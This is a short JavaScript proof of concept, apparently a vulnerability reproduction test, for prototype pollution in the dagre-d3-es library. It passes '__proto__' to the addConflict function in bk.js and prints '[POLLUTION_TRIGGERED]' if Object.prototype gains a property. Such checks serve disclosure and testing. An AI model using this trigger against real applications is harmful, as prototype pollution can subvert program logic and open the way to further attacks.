import("dagre-d3-es/src/dagre/position/bk.js").then(({ addConflict }) => {
    addConflict({}, "__proto__", "pollutedProp");
    console.log({}.pollutedProp !== undefined ? '[POLLUTION_TRIGGERED]':'')
})
